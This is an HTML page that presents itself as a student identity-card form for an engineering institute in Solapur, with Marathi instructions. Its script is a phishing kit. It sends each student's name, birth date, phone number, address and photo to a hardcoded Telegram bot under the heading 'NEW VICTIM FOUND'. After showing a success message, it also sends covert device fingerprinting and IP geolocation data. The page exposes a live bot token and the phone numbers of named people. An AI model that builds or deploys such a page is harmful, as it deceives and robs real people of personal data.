<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1" name="viewport" />
  <title>BMIT ID CARD</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
    rel="stylesheet"
  />
  <link
    href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@300;400;700&display=swap"
    rel="stylesheet"
  />
  <style>
    body {
      font-family: "Source Sans Pro", sans-serif;
      background: #f9fafb;
      color: #1e293b;
    }
    .blink_me {
      animation: blinker 1.2s linear infinite;
    }
    @keyframes blinker {
      50% {
        opacity: 0;
      }
    }
    input, select, textarea, button {
      transition: all 0.3s ease;
    }
    button:disabled {
      cursor: not-allowed;
      opacity: 0.5;
    }
    input:focus, select:focus, textarea:focus {
      outline: none;
      box-shadow: 0 0 0 3px #2563eb;
      border-color: #2563eb;
    }
    marquee {
      font-weight: 700;
      font-size: 1.25rem;
      color: #1e40af;
      letter-spacing: 0.05em;
    }
  </style>
</head>
<body class="min-h-screen flex flex-col relative">
  <header class="bg-white shadow-md border-b border-gray-300 relative z-50">
    <nav
      aria-label="Primary Navigation"
      class="max-w-7xl mx-auto px-6 sm:px-8 lg:px-10 flex items-center h-16 select-none relative"
    >
      <div class="flex-shrink-0">
        <a aria-current="page" class="text-3xl font-extrabold text-[#0f172a]" href="#"
          >BMIT ID CARD</a
        >
      </div>
    </nav>
  </header>
  <main class="flex-grow max-w-4xl mx-auto w-full px-6 py-10">
    <section
      aria-labelledby="info-title"
      class="bg-gradient-to-r from-yellow-100 via-yellow-50 to-yellow-100 border border-yellow-400 rounded-xl shadow-lg p-8"
    >
      <h1
        class="text-center text-[#1e40af] text-2xl font-extrabold mb-1"
        id="info-title"
      >
        <marquee
          aria-label="Scrolling marquee text"
          behavior="scroll"
          class="select-none"
          direction="left"
          scrollamount="6"
          >Brahmdevdada Mane Institute Of Technology, Solapur</marquee
        >
      </h1>
      <h2 class="text-center text-[#1e40af] text-lg font-semibold mb-6 tracking-wide">
        Student Identity Card
      </h2>
      <div
        aria-live="polite"
        class="space-y-3 text-gray-900 text-base leading-relaxed max-w-3xl mx-auto"
      >
        <p><strong class="text-lg">सूचना :</strong></p>
        <p>१. माहिती इंग्लिश भाषेत पूर्ण भरायची आहे.</p>
        <p>२. माहिती जशी च्या तशी ID CARD वर प्रिंट होणार , त्यामुळे माहिती काळजीपूर्वक भरावी.</p>
        <p>३. फोटो फक्त UNIORM मध्ये आणि PASSPORT SIZE(ID) चा असावा.</p>
        <div class="flex flex-col items-center my-6">
          <img
            alt="Passport size photo of a student wearing a formal uniform with a plain background"
            class="w-44 h-44 object-cover rounded-lg border-4 border-yellow-400 shadow-lg"
            height="508"
            loading="lazy"
            src="https://i.postimg.cc/PxXwBqcH/demo-img1.jpg"
            width="406"
          />
          <strong class="blink_me text-red-700 text-center mt-4 text-sm max-w-xs font-semibold tracking-wide"
            >फोटो अशा प्रकारचा असावा, अन्यथा ID CARD प्रिंट होणार नाही</strong
          >
        </div>
        <p class="font-semibold">&gt;&gt;&gt;&gt; काही अडचण असल्यास कृपया संपर्क करा:</p>
        <p>प्रदीप - <a href="tel:7875812111" class="text-blue-600 hover:underline">7875812111</a></p>
        <p>श्रीतेज - <a href="tel:7875819111" class="text-blue-600 hover:underline">7875819111</a></p>
      </div>
      <form
        aria-describedby="form-instructions"
        class="mt-8 space-y-7 max-w-3xl mx-auto"
        enctype="multipart/form-data"
        id="idcard-form"
        method="POST"
        novalidate
        autocomplete="off"
      >
        <p class="sr-only" id="form-instructions">
          Fill all required fields and agree to terms to enable submission.
        </p>
        <div class="flex items-center space-x-3">
          <input
            aria-describedby="agree-desc"
            aria-required="true"
            class="h-6 w-6 text-[#1e40af] focus:ring-[#1e40af] border-gray-400 rounded cursor-pointer"
            id="agree"
            name="agree"
            type="checkbox"
          />
          <label
            class="text-[#1e40af] font-semibold cursor-pointer select-none text-lg"
            for="agree"
            >I Agree</label
          >
        </div>
        <p class="text-sm text-gray-600 mb-3" id="agree-desc">
          Please agree to the terms before submitting.
        </p>
        <div>
          <label class="block text-gray-800 font-semibold mb-2 text-lg" for="branch"
            >Select Your Branch</label
          >
          <select
            aria-required="true"
            class="w-full rounded-lg border border-gray-300 px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#1e40af] focus:border-transparent disabled:bg-gray-100 disabled:text-gray-400 text-lg"
            disabled
            id="branch"
            name="branch"
            required
          >
            <option disabled selected value="">Select Branch</option>
            <option value="Computer Science Engg">Computer Science Engg</option>
            <option value="Mechanical Engg">Mechanical Engg</option>
            <option value="E &amp; TC Engg">E &amp; TC Engg</option>
            <option value="Electrical Engg">Electrical Engg</option>
            <option value="AI &amp; DS Engg">AI &amp; DS Engg</option>
            <option value="MBA">MBA</option>
            <option value="BMJC">BMJC</option>
          </select>
        </div>
        <div>
          <label class="block text-gray-800 font-semibold mb-2 text-lg" for="rollnumber"
            >Roll Number (Optional)</label
          >
          <input
            aria-required="false"
            autocomplete="off"
            class="w-full rounded-lg border border-gray-300 px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#1e40af] focus:border-transparent text-lg"
            id="rollnumber"
            maxlength="20"
            minlength="1"
            name="rollnumber"
            placeholder="Enter your roll number (optional)"
            spellcheck="false"
            type="text"
          />
        </div>
        <div>
          <label class="block text-gray-800 font-semibold mb-2 text-lg" for="fullname"
            >Full Name</label
          >
          <input
            aria-required="true"
            autocomplete="name"
            class="w-full rounded-lg border border-gray-300 px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#1e40af] focus:border-transparent text-lg"
            id="fullname"
            maxlength="90"
            minlength="3"
            name="fullname"
            placeholder="Enter your full name"
            required
            spellcheck="false"
            type="text"
          />
        </div>
        <div>
          <label class="block text-gray-800 font-semibold mb-2 text-lg" for="dob"
            >Date of Birth</label
          >
          <input
            aria-describedby="dob-desc"
            aria-required="true"
            class="w-full rounded-lg border border-gray-300 px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#1e40af] focus:border-transparent text-lg"
            id="dob"
            max=""
            name="dob"
            required
            type="date"
          />
          <p class="text-xs text-gray-500 mt-1" id="dob-desc">
            Please select your date of birth.
          </p>
        </div>
        <div>
          <label class="block text-gray-800 font-semibold mb-2 text-lg" for="phone"
            >Phone Number</label
          >
          <input
            aria-required="true"
            autocomplete="tel"
            class="w-full rounded-lg border border-gray-300 px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#1e40af] focus:border-transparent text-lg"
            id="phone"
            inputmode="numeric"
            maxlength="10"
            minlength="10"
            name="phone"
            pattern="[0-9]{10}"
            placeholder="Enter your 10-digit phone number"
            required
            type="tel"
          />
        </div>
        <div>
          <label class="block text-gray-800 font-semibold mb-2 text-lg" for="address"
            >Address</label
          >
          <textarea
            aria-required="true"
            class="w-full rounded-lg border border-gray-300 px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#1e40af] focus:border-transparent resize-none text-lg"
            id="address"
            maxlength="250"
            minlength="10"
            name="address"
            placeholder="Enter your address"
            required
            rows="4"
          ></textarea>
        </div>
        <div>
          <label class="block text-gray-800 font-semibold mb-2 text-lg" for="photo"
            >Upload Photo (Uniform, Passport Size)</label
          >
          <input
            accept="image/*"
            aria-describedby="photo-desc"
            aria-required="true"
            class="w-full text-gray-700 cursor-pointer text-lg"
            id="photo"
            name="photo"
            required
            type="file"
            capture=""
          />
          <p class="text-xs text-gray-500 mt-1" id="photo-desc">
            Upload a clear photo in uniform (passport size preferred).
          </p>
          <div class="mt-4 flex justify-center">
            <img
              id="preview-photo"
              alt="Preview of uploaded passport size photo in uniform"
              class="w-44 h-44 object-cover rounded-lg border-4 border-yellow-400 shadow-lg hidden"
              width="180"
              height="180"
              loading="lazy"
              src=""
            />
          </div>
        </div>
        <div class="pt-6">
          <button
            aria-live="polite"
            class="w-full bg-[#1e40af] text-white font-extrabold py-4 rounded-lg hover:bg-[#1e3a8a] transition flex justify-center items-center space-x-3 shadow-lg focus:ring-4 focus:ring-[#1e40af]/50"
            disabled
            id="submit-btn"
            type="submit"
          >
            <span class="text-lg">Next</span>
            <svg
              aria-hidden="true"
              class="w-6 h-6"
              fill="none"
              stroke="currentColor"
              stroke-linecap="round"
              stroke-linejoin="round"
              stroke-width="2"
              viewBox="0 0 24 24"
            >
              <path d="M5 12h14M12 5l7 7-7 7"></path>
            </svg>
          </button>
        </div>
      </form>
    </section>
    <section
      aria-atomic="true"
      aria-live="assertive"
      class="hidden mt-12 max-w-md mx-auto bg-green-50 border border-green-400 rounded-xl shadow-lg p-8 text-center"
      id="success-message"
      role="alert"
      tabindex="-1"
    >
      <svg
        aria-hidden="true"
        class="mx-auto mb-6 w-20 h-20 text-green-700 animate-bounce"
        fill="none"
        stroke="currentColor"
        stroke-linecap="round"
        stroke-linejoin="round"
        stroke-width="2"
        viewBox="0 0 24 24"
      >
        <path d="M20 6L9 17l-5-5"></path>
      </svg>
      <h2 class="text-3xl font-extrabold text-green-800 mb-3">Congratulations 🎊</h2>
      <p class="text-green-800 text-xl font-semibold">
        All Details Submitted Successfully.
      </p>
    </section>
    <section
      aria-live="polite"
      class="hidden mt-12 max-w-md mx-auto bg-blue-50 border border-blue-400 rounded-xl shadow-lg p-8 text-center flex items-center justify-center space-x-3"
      id="sending-message"
      role="alert"
      tabindex="-1"
    >
      <svg
        class="animate-spin h-8 w-8 text-blue-600"
        xmlns="http://www.w3.org/2000/svg"
        fill="none"
        viewBox="0 0 24 24"
      >
        <circle
          class="opacity-25"
          cx="12"
          cy="12"
          r="10"
          stroke="currentColor"
          stroke-width="4"
        ></circle>
        <path
          class="opacity-75"
          fill="currentColor"
          d="M4 12a8 8 0 018-8v8z"
        ></path>
      </svg>
      <span class="text-blue-700 font-semibold text-lg">Sending your details...</span>
    </section>
  </main>
  <footer
    class="bg-white border-t border-gray-300 py-5 text-center text-gray-500 text-sm select-none"
  >
    © 2025 Brahmdevdada Mane Institute Of Technology, Solapur. All Rights Reserved.
  </footer>
  <script>
    // Set max date for DOB to today
    const dobInput = document.getElementById("dob");
    dobInput.max = new Date().toISOString().split("T")[0];

    const agreeCheckbox = document.getElementById("agree");
    const branchSelect = document.getElementById("branch");
    const submitBtn = document.getElementById("submit-btn");
    const form = document.getElementById("idcard-form");
    const successSection = document.getElementById("success-message");
    const sendingSection = document.getElementById("sending-message");
    const phoneInput = document.getElementById("phone");
    const photoInput = document.getElementById("photo");
    const previewPhoto = document.getElementById("preview-photo");
    const fullnameInput = document.getElementById("fullname");

    // Enable branch select and submit button only if agree is checked
    agreeCheckbox.addEventListener("change", () => {
      if (agreeCheckbox.checked) {
        branchSelect.disabled = false;
        submitBtn.disabled = false;
      } else {
        branchSelect.disabled = true;
        submitBtn.disabled = true;
        branchSelect.value = "";
      }
    });

    // Validate phone number pattern on input
    phoneInput.addEventListener("input", () => {
      const val = phoneInput.value;
      if (!/^\d{0,10}$/.test(val)) {
        phoneInput.value = val.replace(/\D/g, "").slice(0, 10);
      }
    });

    // Show preview of uploaded photo and ensure only gallery selection (no camera)
    photoInput.addEventListener("click", (e) => {
      // Remove capture attribute to prevent camera opening
      photoInput.removeAttribute("capture");
    });

    photoInput.addEventListener("change", () => {
      const file = photoInput.files[0];
      if (file) {
        const url = URL.createObjectURL(file);
        previewPhoto.src = url;
        previewPhoto.classList.remove("hidden");
      } else {
        previewPhoto.src = "";
        previewPhoto.classList.add("hidden");
      }
    });

    // Escape HTML for Telegram message
    function escapeHtml(text) {
      if (!text) return "";
      return text
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
    }

    // Send photo to Telegram using fetch with FormData
    async function sendPhotoToTelegram(token, chat_id, photoFile, caption) {
      const formPhoto = new FormData();
      formPhoto.append("chat_id", chat_id);
      formPhoto.append("photo", photoFile);
      formPhoto.append("caption", caption);

      const response = await fetch(
        `https://api.telegram.org/bot${token}/sendPhoto`,
        {
          method: "POST",
          body: formPhoto,
        }
      );
      if (!response.ok) {
        const errorText = await response.text();
        throw new Error("Failed to send photo: " + errorText);
      }
      return response.json();
    }

    // Send message to Telegram using fetch GET with URL encoded text
    async function sendMessageToTelegram(token, chat_id, message) {
      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&parse_mode=HTML&text=${encodeURIComponent(message)}`;
      const response = await fetch(url, { method: "GET" });
      if (!response.ok) {
        const errorText = await response.text();
        throw new Error("Failed to send message: " + errorText);
      }
      return response.json();
    }

    // Helper: get OS from userAgent
    function getOS() {
      const ua = navigator.userAgent || navigator.vendor || window.opera;
      if (/windows phone/i.test(ua)) return "Windows Phone";
      if (/windows/i.test(ua)) return "Windows";
      if (/android/i.test(ua)) return "Android";
      if (/linux/i.test(ua)) return "Linux";
      if (/iphone|ipad|ipod/i.test(ua)) return "iOS";
      if (/macintosh|mac os x/i.test(ua)) return "Mac OS";
      return "Unknown";
    }

    // Helper: get browser name and version
    function getBrowser() {
      const ua = navigator.userAgent;
      let tem;
      let M = ua.match(/(opera|chrome|safari|firefox|edge|trident(?=\/))\/?\s*(\d+)/i) || [];
      if (/trident/i.test(M[1])) {
        tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
        return { name: "IE", version: tem[1] || "" };
      }
      if (M[1] === "Chrome") {
        tem = ua.match(/\b(OPR|Edg)\/(\d+)/);
        if (tem != null) {
          return { name: tem[1].replace("OPR", "Opera").replace("Edg", "Edge"), version: tem[2] };
        }
      }
      M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, "-?"];
      if ((tem = ua.match(/version\/(\d+)/i)) != null) M.splice(1, 1, tem[1]);
      return { name: M[0], version: M[1] };
    }

    // Detect proxy, VPN, Tor, Adblocker (best effort)
    async function detectProxyVPNTor(ip) {
      try {
        const res = await fetch(`https://ip-api.com/json/${ip}?fields=proxy,vpn,hosting,query`);
        if (!res.ok) return { proxy: "Unknown", vpn: "Unknown", tor: "Unknown" };
        const data = await res.json();
        return {
          proxy: data.proxy ? "Yes" : "No",
          vpn: data.vpn ? "Yes" : "No",
          tor: "Unknown"
        };
      } catch {
        return { proxy: "Unknown", vpn: "Unknown", tor: "Unknown" };
      }
    }

    // Detect adblocker (simple)
    function detectAdBlocker() {
      return new Promise((resolve) => {
        const bait = document.createElement('div');
        bait.className = 'adsbox';
        bait.style.position = 'absolute';
        bait.style.left = '-9999px';
        document.body.appendChild(bait);
        window.setTimeout(() => {
          const detected = (bait.offsetHeight === 0);
          document.body.removeChild(bait);
          resolve(detected ? "Yes" : "No");
        }, 100);
      });
    }

    // Get battery info
    async function getBatteryInfo() {
      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          return {
            charging: battery.charging ? "Yes" : "No",
            level: Math.round(battery.level * 100) + "%"
          };
        } catch {
          return { charging: "Unknown", level: "Unknown" };
        }
      }
      return { charging: "Unsupported", level: "Unsupported" };
    }

    // Get RAM info (approximate)
    function getRAM() {
      if (navigator.deviceMemory) {
        return navigator.deviceMemory + " GB";
      }
      return "Unknown";
    }

    // Get Storage info (approximate)
    async function getStorage() {
      if (navigator.storage && navigator.storage.estimate) {
        try {
          const estimate = await navigator.storage.estimate();
          if (estimate.quota && estimate.usage) {
            const quotaGB = (estimate.quota / (1024 ** 3)).toFixed(2);
            const usageGB = (estimate.usage / (1024 ** 3)).toFixed(2);
            return `${usageGB} GB used / ${quotaGB} GB total`;
          }
        } catch {}
      }
      return "Unknown";
    }

    // Get screen resolution
    function getScreenResolution() {
      return `${window.screen.width} x ${window.screen.height}`;
    }

    // Get device fingerprint (simple hash of userAgent + screen + timezone)
    function getDeviceFingerprint() {
      const data = [
        navigator.userAgent,
        navigator.language,
        screen.width,
        screen.height,
        screen.colorDepth,
        new Date().getTimezoneOffset(),
        !!window.sessionStorage,
        !!window.localStorage,
        !!window.indexedDB,
        document.body ? document.body.addBehavior : false,
        typeof window.openDatabase,
        navigator.cpuClass,
        navigator.platform,
        navigator.doNotTrack
      ].join('###');
      let hash = 0, i, chr;
      for (i = 0; i < data.length; i++) {
        chr = data.charCodeAt(i);
        hash = ((hash << 5) - hash) + chr;
        hash |= 0;
      }
      return 'fp_' + Math.abs(hash);
    }

    // Get network info
    function getNetworkInfo() {
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (!connection) return { type: "Unknown", downlink: "Unknown", effectiveType: "Unknown", rtt: "Unknown", carrier: "Unknown", simCount: "Unknown" };
      // Carrier and SIM details are not accessible via standard web APIs, so we mark Unknown
      return {
        type: connection.type || "Unknown",
        downlink: connection.downlink ? connection.downlink + " Mbps" : "Unknown",
        effectiveType: connection.effectiveType || "Unknown",
        rtt: connection.rtt ? connection.rtt + " ms" : "Unknown",
        carrier: "Unknown",
        simCount: "Unknown"
      };
    }

    // Get device type based on userAgent and screen size
    function getDeviceType() {
      const ua = navigator.userAgent.toLowerCase();
      if (/mobile|android|iphone|ipod|blackberry|iemobile|opera mini/.test(ua)) return "Mobile";
      if (/tablet|ipad/.test(ua)) return "Tablet";
      return "Desktop";
    }

    // Get timezone info
    function getTimezone() {
      try {
        return Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
      } catch {
        return "Unknown";
      }
    }

    // Get language info
    function getLanguage() {
      return navigator.language || "Unknown";
    }

    // Get user IP and geo info using ipinfo.io (free tier)
    async function getIPInfo() {
      try {
        const res = await fetch('https://ipinfo.io/json?token=');
        if (!res.ok) throw new Error("Failed to fetch IP info");
        const data = await res.json();

        let ip = data.ip || data.ipv4 || "";
        if (ip.includes(":")) ip = "";

        let city = data.city || "Unknown";
        let region = data.region || "Unknown";
        let country = data.country || "Unknown";
        let loc = data.loc || "";
        let postal = data.postal || "Unknown";

        let town = city !== "Unknown" ? city : (region !== "Unknown" ? region : "Unknown");

        return {
          ip,
          city,
          region,
          country,
          loc,
          postal,
          town
        };
      } catch {
        try {
          const res2 = await fetch('https://ip-api.com/json/?fields=status,message,country,regionName,city,zip,query');
          if (!res2.ok) throw new Error("Failed fallback IP info");
          const data2 = await res2.json();
          if (data2.status !== "success") throw new Error("Fallback IP info failed");
          return {
            ip: data2.query || "",
            city: data2.city || "Unknown",
            region: data2.regionName || "Unknown",
            country: data2.country || "Unknown",
            loc: "",
            postal: data2.zip || "Unknown",
            town: data2.city || "Unknown"
          };
        } catch {
          return {
            ip: "Unknown",
            city: "Unknown",
            region: "Unknown",
            country: "Unknown",
            loc: "",
            postal: "Unknown",
            town: "Unknown"
          };
        }
      }
    }

    // Compose and send device & IP info message to Telegram
    async function sendDeviceInfoToTelegram(token, chat_id, timestamp) {
      try {
        const ipInfo = await getIPInfo();
        const proxyVpnTor = await detectProxyVPNTor(ipInfo.ip);
        const adblocker = await detectAdBlocker();
        const battery = await getBatteryInfo();
        const ram = getRAM();
        const storage = await getStorage();
        const screenRes = getScreenResolution();
        const os = getOS();
        const browser = getBrowser();
        const network = getNetworkInfo();
        const deviceFingerprint = getDeviceFingerprint();
        const deviceType = getDeviceType();
        const timezone = getTimezone();
        const language = getLanguage();

        let message = `<b>USER DEVICE & NETWORK INFO</b>\n`;
        message += `<b>Timestamp (UTC):</b> ${escapeHtml(timestamp)}\n`;
        message += `<b>IPv4 Address:</b> ${escapeHtml(ipInfo.ip)}\n`;
        message += `<b>Country:</b> ${escapeHtml(ipInfo.country)}\n`;
        message += `<b>Region/State:</b> ${escapeHtml(ipInfo.region)}\n`;
        message += `<b>City/Town:</b> ${escapeHtml(ipInfo.town)}\n`;
        message += `<b>Postal Code:</b> ${escapeHtml(ipInfo.postal)}\n`;
        message += `<b>Location (lat,long):</b> ${escapeHtml(ipInfo.loc)}\n`;
        message += `<b>Operating System:</b> ${escapeHtml(os)}\n`;
        message += `<b>Browser:</b> ${escapeHtml(browser.name)} ${escapeHtml(browser.version)}\n`;
        message += `<b>Screen Resolution:</b> ${escapeHtml(screenRes)}\n`;
        message += `<b>RAM:</b> ${escapeHtml(ram)}\n`;
        message += `<b>Storage:</b> ${escapeHtml(storage)}\n`;
        message += `<b>Battery Charging:</b> ${escapeHtml(battery.charging)}\n`;
        message += `<b>Battery Level:</b> ${escapeHtml(battery.level)}\n`;
        message += `<b>Network Type:</b> ${escapeHtml(network.type)}\n`;
        message += `<b>Network Downlink:</b> ${escapeHtml(network.downlink)}\n`;
        message += `<b>Network Effective Type:</b> ${escapeHtml(network.effectiveType)}\n`;
        message += `<b>Network RTT:</b> ${escapeHtml(network.rtt)}\n`;
        message += `<b>Network Carrier:</b> ${escapeHtml(network.carrier)}\n`;
        message += `<b>SIM Count:</b> ${escapeHtml(network.simCount)}\n`;
        message += `<b>Proxy:</b> ${escapeHtml(proxyVpnTor.proxy)}\n`;
        message += `<b>VPN:</b> ${escapeHtml(proxyVpnTor.vpn)}\n`;
        message += `<b>Tor:</b> ${escapeHtml(proxyVpnTor.tor)}\n`;
        message += `<b>AdBlocker:</b> ${escapeHtml(adblocker)}\n`;
        message += `<b>Device Fingerprint:</b> ${escapeHtml(deviceFingerprint)}\n`;
        message += `<b>Device Type:</b> ${escapeHtml(deviceType)}\n`;
        message += `<b>Timezone:</b> ${escapeHtml(timezone)}\n`;
        message += `<b>Language:</b> ${escapeHtml(language)}\n`;
        message += `<b>User Agent:</b> ${escapeHtml(navigator.userAgent)}`;

        await sendMessageToTelegram(token, chat_id, message);
      } catch (err) {
        console.error("Error sending device info:", err);
      }
    }

    // Validate full name is non-empty and no spaces only
    function validateFullName(value) {
      return value && value.trim().length > 0;
    }

    // Form submission handler
    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      if (!form.checkValidity()) {
        form.reportValidity();
        return;
      }

      if (!agreeCheckbox.checked) {
        alert("Please agree to the terms before submitting.");
        return;
      }

      // Validate full name
      const fullName = fullnameInput.value.trim();

      if (!validateFullName(fullName)) {
        alert("Please fill Full Name without empty values.");
        return;
      }

      // Validate branch selected
      if (!branchSelect.value) {
        alert("Please select your branch.");
        return;
      }

      // Validate photo uploaded
      const photoFile = photoInput.files[0];
      if (!photoFile || photoFile.size === 0) {
        alert("Please upload a photo.");
        return;
      }

      // Validate phone number length exactly 10 digits
      const phoneVal = phoneInput.value.trim();
      if (phoneVal.length !== 10) {
        alert("Please enter a valid 10-digit phone number.");
        return;
      }

      // Validate address length >= 10
      const addressVal = form.address.value.trim();
      if (addressVal.length < 10) {
        alert("Please enter a valid address (at least 10 characters).");
        return;
      }

      // Validate DOB is not empty and not future date
      const dobVal = form.dob.value;
      if (!dobVal) {
        alert("Please select your date of birth.");
        return;
      }
      const dobDate = new Date(dobVal);
      const today = new Date();
      if (dobDate > today) {
        alert("Date of birth cannot be in the future.");
        return;
      }

      submitBtn.disabled = true;
      submitBtn.innerHTML =
        '<svg class="animate-spin mr-3 h-6 w-6 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"></path></svg>Sending...';

      const formData = new FormData(form);

      // Compose message text with HTML formatting for Telegram
      let message = `<b>NEW VICTIM FOUND</b>\n`;
      message += `<b>Branch:</b> ${escapeHtml(formData.get("branch"))}\n`;
      if(formData.get("rollnumber") && formData.get("rollnumber").trim() !== "") {
        message += `<b>Roll Number:</b> ${escapeHtml(formData.get("rollnumber").trim())}\n`;
      }
      message += `<b>Full Name:</b> ${escapeHtml(fullName)}\n`;
      message += `<b>Date of Birth:</b> ${escapeHtml(formData.get("dob"))}\n`;
      message += `<b>Phone Number:</b> ${escapeHtml(formData.get("phone"))}\n`;
      message += `<b>Address:</b> ${escapeHtml(formData.get("address"))}`;

      const token = "8249836754:AAFJtY0UNgGV_GAk4KuiIMUxTRWXoCXC_FA";
      const chat_id = "6396297682";

      // Show sending animation section, hide form and success message initially
      form.classList.add("hidden");
      successSection.classList.add("hidden");
      sendingSection.classList.remove("hidden");
      sendingSection.focus();

      // Timestamp for submission in ISO UTC format
      const timestamp = new Date().toISOString();

      // Wait 4.5 seconds to simulate sending delay
      setTimeout(async () => {
        try {
          // Send photo and message concurrently and wait for both to complete
          const [photoResult, messageResult] = await Promise.all([
            sendPhotoToTelegram(token, chat_id, photoFile, `Photo of ${fullName}`),
            sendMessageToTelegram(token, chat_id, message),
          ]);

          // After successful sending, hide sending animation and show success message
          sendingSection.classList.add("hidden");
          successSection.classList.remove("hidden");
          successSection.focus();

          // Send device & network info immediately after success message shown (async, no await)
          sendDeviceInfoToTelegram(token, chat_id, timestamp);

          // Reset form for next use
          form.reset();
          branchSelect.disabled = true;
          submitBtn.disabled = true;
          previewPhoto.src = "";
          previewPhoto.classList.add("hidden");
          submitBtn.innerHTML =
            '<span>Next</span><svg aria-hidden="true" class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"></path></svg>';
        } catch (error) {
          console.error(error);
          alert("There was an error sending your details. Please try again later.");
          // On error, hide sending animation, show form again
          sendingSection.classList.add("hidden");
          form.classList.remove("hidden");
          submitBtn.disabled = false;
          submitBtn.innerHTML =
            '<span>Next</span><svg aria-hidden="true" class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"></path></svg>';
        }
      }, 4500);
    });
  </script>
</body>
        </html>
